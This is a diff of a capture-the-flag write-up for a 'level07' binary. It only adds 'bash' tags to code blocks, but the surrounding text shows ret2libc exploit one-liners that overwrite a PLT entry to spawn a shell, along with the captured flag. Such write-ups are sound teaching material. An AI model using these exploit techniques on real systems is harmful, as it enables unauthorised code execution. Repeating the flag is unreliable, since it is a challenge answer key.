@@ -4,7 +4,7 @@ addr of exit: 0xf7e6aed0
 
 Ret2libc code:
 
-```
+```bash
 python -c 'print "\xf7\xe6\xae\xd0"[::-1] + "\xf7\xe6\xae\xd0"[::-1] + "\xf7\xf8\x97\xec"[::-1] + "\n" + "
 ```
 
@@ -13,7 +13,7 @@ Command[20] could allow us to store this ret2libc as the commands are quite shor
 
 To do so we can first call for a garbage command to prefix our shellcode
 
-```
+```bash
 python -c 'print "AAAAAA" + "\xf7\xe6\xae\xd0"[::-1] + "\xf7\xe6\xae\xd0"[::-1] + "\xf7\xf8\x97\xec"[::-1] + "\n"'
 ```
 
@@ -25,7 +25,7 @@ To do so we can override the address of the plt of a function
 -> printf : 0x804a000
 -> fgets : 0x804a00c
 
-```
+```bash
 (python -c 'print "AAAAAA" + "\xf7\xe6\xae\xd0"[::-1] + "\xf7\xe6\xae\xd0"[::-1] + "\xf7\xf8\x97\xec"[::-1] + "\n" + "store" + "\n" + "<addr of buffer command>"[::-1] + "\n" + "diff between addr of data_storage and printf plt"' ; cat) | ./level07
 (python -c 'print "AAAAAA" + "\xf7\xe6\xae\xd0"[::-1] + "\xf7\xe6\xae\xd0"[::-1] + "\xf7\xf8\x97\xec"[::-1] + "\n" + "store" + "\n" + "4294956639" + "\n" + "4160435336"' ; cat) | ./level07
 ```
@@ -73,7 +73,6 @@ level08
 ```
 
 flag
-
 ```
 7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
 ```
